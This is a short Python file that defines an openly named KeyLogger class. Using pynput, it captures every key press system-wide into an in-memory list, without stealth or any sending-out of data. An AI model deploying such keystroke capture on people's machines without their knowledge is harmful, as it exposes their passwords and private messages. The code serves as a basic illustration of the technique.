from pynput.keyboard import Listener
from InterFace import KeyLoggerSystem

class KeyLogger(KeyLoggerSystem):
    def __init__(self):
        self.listener = Listener(on_press=self.on_press)
        self.logged_keys = []

    def on_press(self, key):
        self.logged_keys.append(str(key))

    def start_listening(self):
        with self.listener:
            self.listener.join()

    def stop_listening(self):
        self.listener.stop()

    def get_logged_keys(self):
        return self.logged_keys


if __name__ == '__main__':
    kl = KeyLogger()
    kl.start_listening()